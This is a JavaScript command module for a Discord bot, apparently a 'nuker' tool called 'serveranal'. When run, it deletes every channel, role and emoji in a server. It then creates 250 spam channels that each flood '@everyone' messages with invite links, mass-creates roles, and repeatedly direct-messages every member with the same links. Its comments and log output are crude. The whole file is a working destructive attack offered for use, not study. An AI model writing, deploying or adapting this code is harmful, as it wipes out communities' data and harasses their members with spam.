const { green } = require('chalk');

module.exports.run = async (bot, message) => {
        // Delete all of the channels inside of the guild
        await message.guild.channels.cache.forEach(channel => channel.delete());

        // Create a shit ton of channels inside of the guild
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create('discord-gg-wTWqSwNkft')
            channels.then(
                function (channel) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('@everyone - discord.gg/BmCuuu6BYd')
                    }
                }
            );
        }

        // Delete all of the roles inside of the guild
        message.guild.roles.cache.forEach((role) => {
            if (role.id === message.guild.id) {
              return;
            }
            if (!role.editable) {
                return;
            } else {
              role.delete('yes');
            }
        })

        // Create a shit ton of roles inside of the guild
        setInterval(function () {
            var i = 0; i < 250;
            message.guild.roles.create({
                data: {
                    name: 'discord.gg/BmCuuu6BYd',
                    position: i++,
                    color: "RANDOM"
                }
            })
        }, 100)

        // Delete all of the emojis inside of hte guild
        message.guild.emojis.cache.forEach(e => e.delete());

        // DM all of the users inside of the guild
        setInterval(function () {
            message.guild.members.cache.forEach(member => {
              if (member.id != bot.user.id && !member.user.bot) member.send('discord.gg/BmCuuu6BYd')
            })
        }, 100)
    console.log(green('Server Anal - I just butt fucked a server'))
}

module.exports.config = {
    name: 'serveranal',
    description: 'Pretty much all of the commands combined',
    usage: '.serveranal',
    accessableby: 'Members',
    aliases: ['destroy', 'analserver']
  };